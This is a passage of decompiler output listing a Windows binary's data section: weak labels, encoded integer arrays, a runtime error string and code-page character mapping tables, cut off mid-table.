_UNKNOWN loc_414118; // weak
_UNKNOWN loc_41411F; // weak
_UNKNOWN loc_414422; // weak
_UNKNOWN loc_414429; // weak
_UNKNOWN loc_4144C8; // weak
_UNKNOWN loc_4144CF; // weak
_UNKNOWN loc_4145A1; // weak
_UNKNOWN loc_4145A8; // weak
_UNKNOWN loc_414632; // weak
_UNKNOWN loc_414639; // weak
_UNKNOWN loc_41477C; // weak
_UNKNOWN loc_414862; // weak
_UNKNOWN loc_414869; // weak
_UNKNOWN loc_41491C; // weak
_UNKNOWN loc_414923; // weak
_UNKNOWN loc_41493C; // weak
_UNKNOWN loc_414943; // weak
_UNKNOWN loc_414AD1; // weak
_UNKNOWN loc_414AD8; // weak
_UNKNOWN loc_414C9C; // weak
_UNKNOWN loc_414CA3; // weak
_UNKNOWN loc_414CBF; // weak
_UNKNOWN loc_414CC6; // weak
_UNKNOWN loc_414CDF; // weak
_UNKNOWN loc_414CE6; // weak
_UNKNOWN loc_414ED5; // weak
_UNKNOWN loc_414EDC; // weak
_UNKNOWN loc_4150BF; // weak
_UNKNOWN loc_4150C6; // weak
_UNKNOWN loc_4150E6; // weak
_UNKNOWN loc_4150ED; // weak
_UNKNOWN loc_4152FC; // weak
_UNKNOWN loc_415303; // weak
_UNKNOWN loc_415319; // weak
_UNKNOWN loc_415320; // weak
_UNKNOWN loc_41537C; // weak
_UNKNOWN loc_415383; // weak
_UNKNOWN loc_415407; // weak
_UNKNOWN loc_41540E; // weak
_UNKNOWN loc_4154AA; // weak
_UNKNOWN loc_4154B1; // weak
_UNKNOWN loc_4154D2; // weak
_UNKNOWN loc_4154D9; // weak
_UNKNOWN loc_415574; // weak
_UNKNOWN loc_41557B; // weak
_UNKNOWN loc_415869; // weak
_UNKNOWN loc_41591F; // weak
_UNKNOWN loc_415988; // weak
int dword_415B3C[4] = { -2106818033, 1870798962, 1451447171, 1317233283 }; // weak
int dword_415B98[4] = { 1632654351, 1919251572, 1851870574, 1919248225 }; // weak
_UNKNOWN loc_415C6F; // weak
_UNKNOWN loc_415C76; // weak
_UNKNOWN loc_415D65; // weak
_UNKNOWN loc_415E99; // weak
_UNKNOWN loc_415F9C; // weak
_UNKNOWN loc_415FA3; // weak
_UNKNOWN loc_41608C; // weak
_UNKNOWN loc_416093; // weak
_UNKNOWN loc_41616A; // weak
_UNKNOWN loc_416171; // weak
_UNKNOWN loc_4161FD; // weak
_UNKNOWN loc_416204; // weak
_UNKNOWN loc_4162CE; // weak
_UNKNOWN loc_4162D5; // weak
_UNKNOWN loc_41638C; // weak
_UNKNOWN loc_416393; // weak
_UNKNOWN loc_416468; // weak
_UNKNOWN loc_41646F; // weak
_UNKNOWN loc_416673; // weak
_UNKNOWN loc_41667A; // weak
_UNKNOWN loc_4168AD; // weak
_UNKNOWN loc_4168B4; // weak
int dword_4168C4[3] = { 51, -1, 3 }; // weak
int dword_4168D0[3] = { 3359814, -1, 8 }; // weak
int dword_4168F0[3] = { -2139725973, 2104513874, 0 }; // weak
int dword_416904[3] = { 50, -1, 1 }; // weak
int dword_416910[3] = { 53, -1, 1 }; // weak
int dword_41691C[3] = { 56, -1, 1 }; // weak
int dword_416928 = 57; // weak
_UNKNOWN loc_416A09; // weak
_UNKNOWN loc_416A10; // weak
_UNKNOWN loc_416B0F; // weak
_UNKNOWN loc_416B16; // weak
_UNKNOWN loc_416C45; // weak
_UNKNOWN loc_416C4C; // weak
_UNKNOWN loc_416F90; // weak
_UNKNOWN loc_416F97; // weak
int dword_416FA4[3] = { 49, -1, 3 }; // weak
int dword_416FB0[3] = { 3621958, -1, 1 }; // weak
int dword_416FBC[3] = { 46, -1, 1 }; // weak
int dword_416FE4[3] = { 53, -1, 5 }; // weak
int dword_417000[3] = { 57, -1, 5 }; // weak
int dword_41701C[3] = { 7176047, -1, 52 }; // weak
int dword_417028[14] =
{
  -1365268594,
  -1616143950,
  -1650293353,
  -1448302675,
  -1852461919,
  -1449285980,
  2106960818,
  -1616139600,
  -1617974103,
  -1448957011,
  -1434807127,
  -1685497685,
  -1767071569,
  0
}; // weak
int dword_417068[3] = { 7042670, -1, 12 }; // weak
int dword_417074[4] = { 1769961834, 1081442946, 1853261944, 0 }; // weak
int dword_41708C[4] = { 1988329322, 1081438563, 1853261944, 0 }; // weak
int dword_4170A4[3] = { 8090498, -1, 10 }; // weak
int dword_4170B0[5] = { 1970439766, -2005648259, 27254, -1, 3 }; // weak
int dword_4170C4[3] = { 7893124, -1, 11 }; // weak
int dword_4170D0[5] = { -1954645879, 1983807355, 7107722, -1, 38 }; // weak
int dword_4170E4[12] =
{
  -1868980321,
  1583257241,
  -1851551909,
  -1852596915,
  1583257241,
  -1734898085,
  -1852081831,
  -1952552037,
  1889116031,
  30329,
  -1,
  1
}; // weak
_UNKNOWN loc_4171B2; // weak
_UNKNOWN loc_4171B9; // weak
_UNKNOWN loc_4172D2; // weak
_UNKNOWN loc_4172D9; // weak
int dword_4173E0[3] = { 50, -1, 2 }; // weak
int dword_4173EC = 25459; // weak
_UNKNOWN loc_4174A1; // weak
_UNKNOWN loc_4174A8; // weak
_UNKNOWN loc_41759F; // weak
_UNKNOWN loc_4175A6; // weak
_UNKNOWN loc_417795; // weak
_UNKNOWN loc_41779C; // weak
int dword_4177AC[3] = { 64, -1, 1 }; // weak
int dword_4177B8 = 46; // weak
_UNKNOWN loc_417915; // weak
_UNKNOWN loc_41791C; // weak
_UNKNOWN loc_417BCB; // weak
_UNKNOWN loc_417BD2; // weak
int dword_417BE4[3] = { 92, -1, 3 }; // weak
int dword_417BF0[3] = { 2764330, -1, 1 }; // weak
int dword_417BFC[3] = { 46, -1, 2 }; // weak
int dword_417C08 = 11822; // weak
int dword_417C10[2] = { 825098769, 4 }; // weak
_UNKNOWN loc_417C7C; // weak
_UNKNOWN loc_417C83; // weak
_UNKNOWN loc_417D7E; // weak
_UNKNOWN loc_417D85; // weak
_UNKNOWN loc_417EF5; // weak
_UNKNOWN loc_417EFC; // weak
_UNKNOWN loc_4182D1; // weak
_UNKNOWN loc_4182D8; // weak
int dword_4182E8[3] = { 53, -1, 3 }; // weak
int dword_4182F4[3] = { 3359814, -1, 5 }; // weak
int dword_418300[4] = { 897151359, 58, -1, 5 }; // weak
int dword_418330[4] = { 2138191670, 121, -1, 5 }; // weak
int dword_418350[4] = { 2005022518, 127, -1, 5 }; // weak
int dword_418360[4] = { 1954821942, 124, -1, 5 }; // weak
int dword_418370[4] = { -2089863370, 113, -1, 5 }; // weak
int dword_418380[4] = { 1820407606, 110, -1, 5 }; // weak
int dword_4183A0[3] = { 7043686, -1, 1 }; // weak
int dword_4183AC[3] = { 121, -1, 1 }; // weak
int dword_4183B8[3] = { 104, -1, 1 }; // weak
int dword_4183C4[3] = { 105, -1, 1 }; // weak
int dword_4183D0[3] = { 116, -1, 1 }; // weak
int dword_4183DC[3] = { 49, -1, 42 }; // weak
int dword_4183E8[13] =
{
  -1533698684,
  -1784574040,
  -1818723443,
  -1616732765,
  -2020892009,
  -2020904846,
  -1939640206,
  1351716744,
  -1784965257,
  -1651475375,
  35478,
  -1,
  1
}; // weak
int dword_41841C[3] = { 119, -1, 1 }; // weak
int dword_418428[3] = { 50, -1, 1 }; // weak
int dword_418434 = 100; // weak
_UNKNOWN loc_4184B7; // weak
_UNKNOWN loc_4184BE; // weak
_UNKNOWN loc_4187C9; // weak
_UNKNOWN loc_4187D0; // weak
int dword_4187E0[6] = { 2105444983, 2139454356, -2090044289, 1280072589, 2140241225, 0 }; // weak
int dword_4187F8[3] = { 14849, -1, 13 }; // weak
int dword_418804[6] = { -2021166480, 2022340227, 1953775479, 136, -1, 5 }; // weak
int dword_41882C[4] = { -2139453585, -2054652041, -2138668433, 0 }; // weak
int dword_418844[4] = { 1899576384, 28549, -1, 9 }; // weak
int dword_418854[5] = { 1115322740, -2022491326, 117, -1, 21 }; // weak
int dword_418868[6] = { -2138278570, -2021813633, 1853259137, 1314753413, -1820375218, 129 }; // weak
_UNKNOWN loc_418B06; // weak
_UNKNOWN loc_418B0D; // weak
int dword_418B1C[3] = { 50, -1, 3 }; // weak
int dword_418B28[3] = { 3621958, -1, 11 }; // weak
int dword_418B34[5] = { 1918067310, 1061307007, 7702391, -1, 53 }; // weak
int dword_418B48[16] =
{
  -1348425585,
  -1599300941,
  -1633450344,
  -1431459666,
  -1835618910,
  -1432442971,
  2123803827,
  -1599296591,
  -1601131094,
  -1432114002,
  -1332963926,
  -1382052694,
  -1600281934,
  175,
  -1,
  8
}; // weak
int dword_418B88[3] = { -2072609197, 1077968500, 0 }; // weak
int dword_418B9C[5] = { -2089196946, 1061306965, 7702391, -1, 26 }; // weak
int dword_418BB0[9] =
{
  -2038131066,
  2089061002,
  -1937471852,
  -1869710707,
  -2089055098,
  -2121495664,
  33423,
  -1,
  1
}; // weak
int dword_418C04[5] = { 1584620142, 1061307018, 7702391, -1, 7 }; // weak
int dword_418C18[4] = { 2137882465, 8159362, -1, 30 }; // weak
int dword_418C28[8] =
{
  -2020839551,
  -1818848873,
  1833145995,
  -1769433453,
  1150781331,
  -1920366476,
  -1991145592,
  34717
}; // weak
_UNKNOWN loc_418DB9; // weak
_UNKNOWN loc_418DC0; // weak
_UNKNOWN loc_418E17; // weak
_UNKNOWN loc_418E1E; // weak
_UNKNOWN loc_418EAB; // weak
_UNKNOWN loc_418EB2; // weak
_UNKNOWN loc_418F7C; // weak
_UNKNOWN loc_418F83; // weak
int dword_418F94[3] = { 3752774, -1, 1 }; // weak
int dword_418FA0[3] = { 48, -1, 1 }; // weak
int dword_418FAC[3] = { 49, -1, 3 }; // weak
_UNKNOWN loc_419035; // weak
_UNKNOWN loc_41903C; // weak
_UNKNOWN loc_419052; // weak
_UNKNOWN loc_419059; // weak
int dword_419064[2] = { 841875985, 4 }; // weak
int dword_4190BC[3] = { 49, -1, 1 }; // weak
int dword_4190C8 = 51; // weak
_UNKNOWN loc_419F4E; // weak
_UNKNOWN loc_419F55; // weak
_UNKNOWN loc_41A017; // weak
_UNKNOWN loc_41A01E; // weak
int dword_41A02C[12] =
{
  -1500012666,
  -1750888022,
  -1785037425,
  -1583046747,
  2072880281,
  -1533631327,
  1386583457,
  -1584098444,
  1386585768,
  -1818259072,
  -1901881958,
  0
}; // weak
int dword_41A064[6] = { 2071952735, 982353040, -2038269592, 2105301307, -1903719030, 0 }; // weak
int dword_41A084[5] = { 2121363537, -2105377915, 108, -1, 1 }; // weak
int dword_41A098[3] = { 92, -1, 18 }; // weak
int dword_41A0A4[7] = { 1751868268, 2038717241, 1496810114, 2106161789, 35212, -1, 11 }; // weak
int dword_41A0C0[5] = { 1633967205, -2089459150, 8549512, -1, 17 }; // weak
int dword_41A0D4[7] = { 1735025259, -1971365576, -1871216248, -2072550600, 125, -1, 14 }; // weak
int dword_41A0F0[6] = { 2021819525, 1116502398, 1116174211, 35458, -1, 1 }; // weak
int dword_41A108[3] = { 64, -1, 5 }; // weak
int dword_41A144[5] = { 2054388855, 1954298741, 132, -1, 10 }; // weak
int dword_41A158[5] = { 1903918198, 2117956468, 33398, -1, 17 }; // weak
int dword_41A16C[7] = { -2089253764, -2138933123, 2051309691, -2075884921, 144, -1, 3 }; // weak
int dword_41A188[3] = { 3490886, -1, 1 }; // weak
int dword_41A194[3] = { 49, -1, 1 }; // weak
int dword_41A1A0[3] = { 48, -1, 3 }; // weak
int dword_41A1AC[3] = { 3556422, -1, 3 }; // weak
int dword_41A1B8[3] = { 7895631, -1, 17 }; // weak
int dword_41A1C4[7] = { 2021819488, -2071627720, -1971636857, 931755660, 87, -1, 26 }; // weak
int dword_41A1E0[9] =
{
  1083346287,
  -1886616681,
  -1836106092,
  -1886155632,
  -1836695987,
  -2121760382,
  19604,
  -1,
  55
}; // weak
int dword_41A204[16] =
{
  -1436770158,
  -1398756961,
  -1313890210,
  -1348641885,
  -1280990303,
  -1632871507,
  -1369662288,
  -1436770125,
  -1566549085,
  -1297065039,
  -1414419618,
  -1587762510,
  -1498260573,
  10334129,
  -1,
  51
}; // weak
int dword_41A244[15] =
{
  -1633113473,
  -1504139604,
  -1364699233,
  -1399219297,
  -1364092838,
  1504352414,
  1504093853,
  -1705466977,
  -1566532948,
  -1437030736,
  -1386701649,
  -1700440161,
  10984360,
  -1,
  41
}; // weak
int dword_41A280[13] =
{
  -1801543563,
  -1555129182,
  -1533719147,
  1335075235,
  -1801281387,
  -1834971568,
  -1633380712,
  -1801216432,
  1335075152,
  -1818456419,
  159,
  -1,
  52
}; // weak
int dword_41A2B4[14] =
{
  -1616008320,
  1521261915,
  -1688623968,
  -1549689939,
  -1655068751,
  -1504074070,
  -1465755492,
  -1481922655,
  765631388,
  -1347790679,
  -1616488288,
  -1633769381,
  -1616008284,
  0
}; // weak
int dword_41A2F4[5] = { 909540703, 915178335, 913999480, 1435141008, 0 }; // weak
int dword_41A310[8] = { 998211183, 999262357, -2138146168, 1866090382, -2037876092, 143, -1, 49 }; // weak
int dword_41A330[15] =
{
  -1666624127,
  -1336501850,
  -1420383577,
  1470733984,
  -1667064162,
  1470406232,
  -1667586137,
  -1498786390,
  -1382572712,
  -1498458723,
  -1739151443,
  -1700811876,
  157,
  -1,
  49
}; // weak
int dword_41A36C[15] =
{
  -1499572863,
  -1336501592,
  -1705596249,
  -1621711975,
  1470538141,
  -1370056027,
  1470015905,
  -1432379988,
  -1549821096,
  -1616226915,
  -2141804135,
  -1516525480,
  156,
  -1,
  41
}; // weak
int dword_41A3A8[13] =
{
  -1634316935,
  -1471245664,
  -1689345377,
  1335072921,
  1335072164,
  -1801808234,
  -1869176496,
  1333218724,
  -1818455389,
  -1633202785,
  165,
  -1,
  54
}; // weak
int dword_41A3DC[16] =
{
  -1348164975,
  1554948957,
  1554031281,
  -1582849117,
  -1331383971,
  -1532011867,
  -1432069470,
  -1448236637,
  -1415270754,
  -1532011861,
  -1252282722,
  -1654935636,
  -1571052112,
  44204,
  -1,
  3
}; // weak
int dword_41A41C[3] = { 7105149, -1, 4 }; // weak
int dword_41A438[3] = { 1919975275, 2054778941, 0 }; // weak
int dword_41A45C[3] = { 50, -1, 4 }; // weak
int dword_41A478[3] = { 3425094, -1, 4 }; // weak
int dword_41A494[3] = { 7237754, -1, 3 }; // weak
int dword_41A4A0[3] = { 7566710, -1, 3 }; // weak
int dword_41A4AC[3] = { 8153196, -1, 3 }; // weak
int dword_41A4B8[3] = { 7698029, -1, 1 }; // weak
int dword_41A4C4[3] = { 119, -1, 1 }; // weak
int dword_41A4D0[3] = { 121, -1, 1 }; // weak
int dword_41A4DC[3] = { 104, -1, 1 }; // weak
int dword_41A4E8[3] = { 105, -1, 1 }; // weak
int dword_41A4F4[3] = { 116, -1, 4 }; // weak
int dword_41A520[3] = { 27004, -1, 4 }; // weak
int dword_41A53C[3] = { 55, -1, 3 }; // weak
int dword_41A548[3] = { 3359814, -1, 3 }; // weak
int dword_41A554[3] = { 7176047, -1, 1 }; // weak
int dword_41A560[3] = { 46, -1, 1 }; // weak
int dword_41A59C[7] = { -2004186231, -2054912372, -1937942647, 1200322695, 8750717, -1, 1 }; // weak
int dword_41A5B8[3] = { 56, -1, 3 }; // weak
int dword_41A5C4[3] = { 3687238, -1, 1 }; // weak
int dword_41A5D0[3] = { 57, -1, 4 }; // weak
_UNKNOWN loc_41A6FA; // weak
_UNKNOWN loc_41A701; // weak
int dword_41A710[3] = { 3425094, -1, 37 }; // weak
int dword_41A71C[12] =
{
  -1617913729,
  -1868789085,
  -1902938488,
  -1700947810,
  1954979218,
  -1651532390,
  1268682394,
  -1751473807,
  -1651532901,
  136,
  -1,
  18
}; // weak
int dword_41A74C[7] = { -2037480099, 2088273285, -1971299783, -2020902530, 36747, -1, 4 }; // weak
int dword_41A778 = 49; // weak
_UNKNOWN loc_41A7D1; // weak
_UNKNOWN loc_41A7D8; // weak
int dword_41A7E8 = 32; // weak
_UNKNOWN loc_41A8CB; // weak
int dword_41A8D4 = 25; // weak
_UNKNOWN loc_41B48E; // weak
_UNKNOWN loc_41B4DD; // weak
_UNKNOWN loc_41B4E4; // weak
int dword_41B4F4[6] = { 1767531113, 1516655725, -2021824910, 8483929, -1, 3 }; // weak
int dword_41B50C[3] = { 3162950, -1, 65 }; // weak
int dword_41B518[19] =
{
  -1146309477,
  -1397184833,
  -1431334236,
  -1229343558,
  -1633502802,
  -1230326863,
  -1969047361,
  -1397180483,
  -1399014986,
  -1229997894,
  -1081368138,
  -1179274824,
  -1700612179,
  -1280136528,
  -1279947928,
  -1162302804,
  164,
  -1,
  8
}; // weak
int dword_41B564[3] = { -2122354337, 2054060670, 0 }; // weak
int dword_41B578[4] = { 2021617746, 8157826, -1, 10 }; // weak
int dword_41B588[5] = { 1971415627, 2087880564, 29302, -1, 3 }; // weak
int dword_41B59C[3] = { 3228742, -1, 4 }; // weak
int dword_41B5B8[3] = { 3228486, -1, 6 }; // weak
int dword_41B5C4[4] = { 1870492544, 15424, -1, 6 }; // weak
int dword_41B5D4[4] = { 2037149056, 15424, -1, 8 }; // weak
int dword_41B5E4[3] = { 1920696705, 1077966971, 0 }; // weak
int dword_41B5F8[3] = { 32, -1, 1 }; // weak
int dword_41B604[3] = { 92, -1, 9 }; // weak
int dword_41B610[5] = { 1115456130, -2022491326, 117, -1, 1 }; // weak
int dword_41B624[3] = { 50, -1, 2 }; // weak
int dword_41B630[3] = { 25459, -1, 1 }; // weak
int dword_41B63C = 56; // weak
int dword_41B650[5] = { -2089196946, 1061306965, 7702391, -1, 2 }; // weak
int dword_41B664[3] = { 8224, -1, 1 }; // weak
int dword_41B670[3] = { 49, -1, 3 }; // weak
int dword_41B67C[3] = { 3294278, -1, 1 }; // weak
int dword_41B688[3] = { 48, -1, 3 }; // weak
int dword_41B694 = 3752774; // weak
int dword_41B698 = 3551490; // weak
int dword_41B69C[3] = { 3158274, -1, 3 }; // weak
int dword_41B6A8[3] = { 3359814, -1, 3 }; // weak
int dword_41B6B4[3] = { 3290420, -1, 2 }; // weak
int dword_41B6C0[3] = { 23610, -1, 4 }; // weak
int dword_41B6DC[13] =
{
  -1583906677,
  -1902408077,
  -1904304286,
  -1902340491,
  -1905156994,
  -1903191422,
  -2087214477,
  -1904373078,
  2006029949,
  -2020377969,
  141,
  -1,
  89
}; // weak
int dword_41B710[25] =
{
  -775442245,
  2144059043,
  -758070602,
  2144128201,
  2140048273,
  -657535837,
  -943339822,
  2131197396,
  -1869705838,
  -1345286272,
  -1062503040,
  -931216700,
  2139979214,
  -943603032,
  -842826289,
  -1568765312,
  -640497963,
  2139802821,
  -943602003,
  -1061044529,
  -995394098,
  -826161448,
  189,
  -1,
  11
}; // weak
int dword_41B774[5] = { -2089196946, 1065185365, 8620133, -1, 6 }; // weak
__int16 word_41C000 = 4914; // weak
char byte_41C008 = '\0'; // weak
char byte_41C00C = '\0'; // weak
char byte_41C010 = '\0'; // weak
int dword_41C014 = 0; // weak
int dword_41C018 = 0; // weak
int (__cdecl *off_41C01C)(_DWORD) = &sub_401FD8; // weak
int (*off_41C020)(void) = &sub_402160; // weak
int (__cdecl *off_41C024)(_DWORD) = &sub_4024D4; // weak
CHAR Text[16] = "Runtime error   "; // idb
char aAt00000000[14] = "  at 00000000"; // weak
CHAR Caption[] = "Error"; // idb
char byte_41C050[16] =
{
  '0',
  '1',
  '2',
  '3',
  '4',
  '5',
  '6',
  '7',
  '8',
  '9',
  'A',
  'B',
  'C',
  'D',
  'E',
  'F'
}; // weak
char asc_41C060[64] = "                                                                "; // weak
char asc_41C0A0[2] = "\r\n"; // weak
_DWORD dword_41C0A4 = 0; // weak
int dword_41C0A8 = 0; // weak
int dword_41C0B4 = 0; // weak
_DWORD dword_41C0BC = 0; // weak
int dword_41C0C0 = 0; // weak
int dword_41C0C4 = 0; // weak
int dword_41C0C8 = 0; // weak
int dword_41C0CC = 0; // weak
_DWORD dword_41C0D0 = 0; // weak
_UNKNOWN unk_41C0D4; // weak
signed __int32 dword_41C104[8] = { 0, 0, 0, 0, 0, 0, 0, 0 }; // weak
int *off_41C124 = &dword_406BF4; // weak
int (__stdcall *dword_41C128)(_DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
DWORD dwDesiredAccess[3] = { 2147483648u, 1073741824u, 3221225472u }; // weak
DWORD dwShareMode = 0u; // idb
int **off_41C14C[2] = { &off_405FC4, &off_405FCC }; // weak
float flt_41C154 = 8.64e7; // weak
int dword_41C158 = 86400000; // weak
unsigned __int8 byte_41C15C[4] = { 37u, 46u, 42u, 100u }; // weak
int **off_41C160[38] =
{
  &off_40605C,
  &off_406064,
  &off_40606C,
  &off_406074,
  &off_40607C,
  &off_406084,
  &off_40608C,
  &off_406094,
  &off_40609C,
  &off_4060A4,
  &off_4060AC,
  &off_4060B4,
  &off_4060BC,
  &off_4060C4,
  &off_4060CC,
  &off_4060D4,
  &off_4060DC,
  &off_4060E4,
  &off_4060EC,
  &off_4060F4,
  &off_4060FC,
  &off_406104,
  &off_40610C,
  &off_406114,
  &off_40611C,
  &off_406124,
  &off_40612C,
  &off_406134,
  &off_40613C,
  &off_406144,
  &off_40614C,
  &off_406154,
  &off_40615C,
  &off_406164,
  &off_40616C,
  &off_406174,
  &off_40617C,
  &off_406184
}; // weak
int **off_41C190[26] =
{
  &off_4060BC,
  &off_4060C4,
  &off_4060CC,
  &off_4060D4,
  &off_4060DC,
  &off_4060E4,
  &off_4060EC,
  &off_4060F4,
  &off_4060FC,
  &off_406104,
  &off_40610C,
  &off_406114,
  &off_40611C,
  &off_406124,
  &off_40612C,
  &off_406134,
  &off_40613C,
  &off_406144,
  &off_40614C,
  &off_406154,
  &off_40615C,
  &off_406164,
  &off_40616C,
  &off_406174,
  &off_40617C,
  &off_406184
}; // weak
int **off_41C1C0[14] =
{
  &off_40611C,
  &off_406124,
  &off_40612C,
  &off_406134,
  &off_40613C,
  &off_406144,
  &off_40614C,
  &off_406154,
  &off_40615C,
  &off_406164,
  &off_40616C,
  &off_406174,
  &off_40617C,
  &off_406184
}; // weak
int **off_41C1DC[7] =
{
  &off_406154,
  &off_40615C,
  &off_406164,
  &off_40616C,
  &off_406174,
  &off_40617C,
  &off_406184
}; // weak
int dword_41C1F8[] = { 2 }; // weak
int dword_41C1FC[] = { 0 }; // weak
int dword_41C218[] = { 100 }; // weak
int (*off_41C230)[3] = &dword_4064C8; // weak
_DWORD *dword_41C2E0 = NULL; // weak
char *off_41C2E4 = "False"; // weak
int off_41C2EC = 4240596; // weak
int (*off_41C2F0)[4] = &dword_40E504; // weak
int (*off_41C2F8)[4] = &dword_40EAFC; // weak
_WORD word_41C300[128] =
{
  128,
  129,
  130,
  131,
  132,
  133,
  134,
  135,
  136,
  137,
  138,
  139,
  140,
  141,
  142,
  143,
  144,
  145,
  146,
  147,
  148,
  149,
  150,
  151,
  152,
  153,
  154,
  155,
  156,
  157,
  158,
  159,
  160,
  161,
  162,
  163,
  164,
  165,
  166,
  167,
  168,
  169,
  170,
  171,
  172,
  173,
  174,
  175,
  176,
  177,
  178,
  179,
  180,
  181,
  182,
  183,
  184,
  185,
  186,
  187,
  188,
  189,
  190,
  191,
  192,
  193,
  194,
  195,
  196,
  197,
  198,
  199,
  200,
  201,
  202,
  203,
  204,
  205,
  206,
  207,
  208,
  209,
  210,
  211,
  212,
  213,
  214,
  215,
  216,
  217,
  218,
  219,
  220,
  221,
  222,
  223,
  224,
  225,
  226,
  227,
  228,
  229,
  230,
  231,
  232,
  233,
  234,
  235,
  236,
  237,
  238,
  239,
  240,
  241,
  242,
  243,
  244,
  245,
  246,
  247,
  248,
  249,
  250,
  251,
  252,
  253,
  254,
  255
}; // weak
_WORD word_41C400[128] =
{
  128,
  129,
  130,
  131,
  132,
  133,
  134,
  135,
  136,
  137,
  138,
  139,
  140,
  141,
  142,
  143,
  144,
  145,
  146,
  147,
  148,
  149,
  150,
  151,
  152,
  153,
  154,
  155,
  156,
  157,
  158,
  159,
  160,
  260,
  728,
  321,
  164,
  317,
  346,
  167,
  168,
  352,
  350,
  356,
  377,
  173,
  381,
  379,
  176,
  261,
  731,
  322,
  180,
  318,
  347,
  711,
  184,
  353,
  351,
  357,
  378,
  733,
  382,
  380,
  340,
  193,
  194,
  258,
  196,
  313,
  262,
  199,
  268,
  201,
  280,
  203,
  282,
  205,
  206,
  270,
  272,
  323,
  327,
  211,
  212,
  336,
  214,
  215,
  344,
  366,
  218,
  368,
  220,
  221,
  354,
  223,
  341,
  225,
  226,
  259,
  228,
  314,
  263,
  231,
  269,
  233,
  281,
  235,
  283,
  237,
  238,
  271,
  273,
  324,
  328,
  243,
  244,
  337,
  246,
  247,
  345,
  367,
  250,
  369,
  252,
  253,
  355,
  729
}; // weak
_WORD word_41C500[128] =
{
  128,
  129,
  130,
  131,
  132,
  133,
  134,
  135,
  136,
  137,
  138,
  139,
  140,
  141,
  142,
  143,
  144,
  145,
  146,
  147,
  148,
  149,
  150,
  151,
  152,
  153,
  154,
  155,
  156,
  157,
  158,
  159,
  160,
  294,
  728,
  163,
  164,
  -3,
  292,
  167,
  168,
  304,
  350,
  286,
  308,
  173,
  -3,
  379,
  176,
  295,
  178,
  179,
  180,
  181,
  293,
  183,
  184,
  305,
  351,
  287,
  309,
  189,
  -3,
  380,
  192,
  193,
  194,
  -3,
  196,
  266,
  264,
  199,
  200,
  201,
  202,
  203,
  204,
  205,
  206,
  207,
  -3,
  209,
  210,
  211,
  212,
  288,
  214,
  215,
  284,
  217,
  218,
  219,
  220,
  364,
  348,
  223,
  224,
  225,
  226,
  -3,
  228,
  267,
  265,
  231,
  232,
  233,
  234,
  235,
  236,
  237,
  238,
  239,
  -3,
  241,
  242,
  243,
  244,
  289,
  246,
  247,
  285,
  249,
  250,
  251,
  252,
  365,
  349,
  729
}; // weak
_WORD word_41C600[128] =
{
  128,
  129,
  130,
  131,
  132,
  133,
  134,
  135,
  136,
  137,
  138,
  139,
  140,
  141,
  142,
  143,
  144,
  145,
  146,
  147,
  148,
  149,
  150,
  151,
  152,
  153,
  154,
  155,
  156,
  157,
  158,
  159,
  160,
  260,
  312,
  342,
  164,
  296,
  315,
  167,
  168,
  352,
  274,
  290,
  358,
  173,
  381,
  175,
  176,
  261,
  731,
  343,
  180,
  297,
  316,
  711,
  184,
  353,
  275,
  291,
  359,
  330,
  382,
  331,
  256,
  193,
  194,
  195,
  196,
  197,
  198,
  302,
  268,
  201,
  280,
  203,
  278,
  205,
  206,
  298,
  272,
  325,
  332,
  310,
  212,
  213,
  214,
  215,
  216,
  370,
  218,
  219,
  220,
  360,
  362,
  223,
  257,
  225,
  226,
  227,
  228,
  229,
  230,
  303,
  269,
  233,
  281,
  235,
  279,
  237,
  238,
  299,
  273,
  326,
  333,
  311,
  244,
  245,
  246,
  247,
  248,
  371,
  250,
  251,
  252,
  361,
  363,
  729
}; // weak
_WORD word_41C700[128] =
{
  128,
  129,
  130,
  131,
  132,
  133,
  134,
  135,
  136,
  137,
  138,
  139,
  140,
  141,
  142,
  143,
  144,
  145,
  146,
  147,
  148,
  149,
  150,
  151,
  152,
  153,
  154,
  155,
  156,
  157,
  158,
  159,
  160,
  1025,
  1026,
  1027,
  1028,
  1029,
  1030,
  1031,
  1032,
  1033,
  1034,
  1035,
  1036,
  173,
  1038,
  1039,
  1040,
  1041,
  1042,
  1043,
  1044,
  1045,
  1046,
  1047,
  1048,
  1049,
  1050,
  1051,
  1052,
  1053,
  1054,
  1055,
  1056,
  1057,
  1058,
  1059,
  1060,
  1061,
  1062,
  1063,
  1064,
  1065,
  1066,
  1067,
  1068,
  1069,
  1070,
  1071,
  1072,
  1073,
  1074,
  1075,
  1076,
  1077,
  1078,
  1079,
  1080,
  1081,
  1082,
  1083,
  1084,
  1085,
  1086,
  1087,
  1088,
  1089,
  1090,
  1091,
  1092,
  1093,
  1094,
  1095,
  1096,
  1097,
  1098,
  1099,
  1100,
  1101,
  1102,
  1103,
  8470,
  1105,
  1106,
  1107,
  1108,
  1109,
  1110,
  1111,
  1112,
  1113,
  1114,
  1115,
  1116,
  167,
  1118,
  1119
}; // weak
_WORD word_41C800[128] =
{
  128,
  129,
  130,
  131,
  132,
  133,
  134,
  135,
  136,
  137,
  138,
  139,
  140,
  141,
  142,
  143,
  144,
  145,
  146,
  147,
  148,
  149,
  150,
  151,
  152,
  153,
  154,
  155,
  156,
  157,
  158,
  159,
  160,
  -3,
  -3,
  -3,
  164,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  1548,
  173,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  1563,
  -3,
  -3,
  -3,
  1567,
  -3,
  1569,
  1570,
  1571,
  1572,
  1573,
  1574,
  1575,
  1576,
  1577,
  1578,
  1579,
  1580,
  1581,
  1582,
  1583,
  1584,
  1585,
  1586,
  1587,
  1588,
  1589,
  1590,
  1591,
  1592,
  1593,
  1594,
  -3,
  -3,
  -3,
  -3,
  -3,
  1600,
  1601,
  1602,
  1603,
  1604,
  1605,
  1606,
  1607,
  1608,
  1609,
  1610,
  1611,
  1612,
  1613,
  1614,
  1615,
  1616,
  1617,
  1618,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3,
  -3
}; // weak
_WORD word_41C900[128] =
{
  128,
  129,
  130,
  131,
  132,
  133,
  134,
  135,
  136,
  137,
  138,
  139,
  140,
  141,
  142,
  143,
  144,
  145,
  146,
  147,
  148,
  149,
  150,
  151,
  152,
  153,
  154,
  155,
  156,
  157,
  158,
  159,
  160,
  8216,
  8217,
  163,
  -3,
  -3,
  166,
  167,
  168,
  169,
  -3,
  171,
  172,
  173,
  -3,
  8213,
  176,
  177,
  178,
